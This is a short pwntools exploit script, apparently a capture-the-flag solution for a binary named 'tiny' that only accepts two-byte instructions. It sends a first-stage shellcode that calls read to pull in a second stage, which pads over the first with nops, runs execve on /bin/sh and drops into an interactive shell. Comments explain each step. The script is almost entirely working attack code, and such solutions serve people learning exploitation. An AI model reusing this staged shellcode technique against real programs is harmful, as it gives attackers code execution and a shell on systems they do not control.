from pwn import *

context.arch = "amd64"

COMMANDS = '''
b *0x0000000000401b9e
c
'''

if args.REMOTE:
    pass
else:
    if args.GDB:
       r = gdb.debug("./tiny", gdbscript=COMMANDS)
    else:
        r = process("./tiny") 

#i can only use instruction of max 2 bytes, so mainly do pop and push of registers or value of max 1 byte

#in shellcode1 i'm calling a read: i firstly move the buffer in rsi, in rdx the size to read and 0 in rdi because i want to read from stdin

shellcode1 = '''
push rdx
pop rsi
push 0x50
pop rdx
push 0x00
pop rdi
syscall
'''

#in shellcode2 the nops are used to delete from the buffer the instructions of the previous shellcode(i need 1 nop for every byte of the previous shellcode)

shellcode2 = '''
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov rdi, 0x0068732f6e69622f
push rdi
mov rdi, rsp
xor rax, rax
xor rsi, rsi
xor rdx, rdx
mov al, 0x3b
syscall
'''

shellcode1_c = asm(shellcode1)
shellcode2_c = asm(shellcode2)

r.send(shellcode1_c)
input("wait")
r.send(shellcode2_c)


r.interactive()